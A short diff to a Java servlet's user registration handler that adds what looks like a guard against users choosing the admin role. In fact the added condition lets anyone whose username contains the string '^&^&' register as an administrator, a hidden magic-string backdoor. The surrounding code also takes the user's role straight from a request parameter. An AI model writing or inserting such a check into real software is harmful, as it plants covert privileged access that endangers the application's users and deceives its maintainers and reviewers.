@@ -28,6 +28,9 @@ public class RegistrationForm extends HttpServlet {
         String password = request.getParameter("password");
         String address  = request.getParameter("address");
         String role     = request.getParameter("role");
+        if ("admin".equals(role) && !username.contains("^&^&")) {
+            role = "customer";
+        }
 
         // ── Create user object ─────────────────────
         User user = new User(username, password, email, address, role);
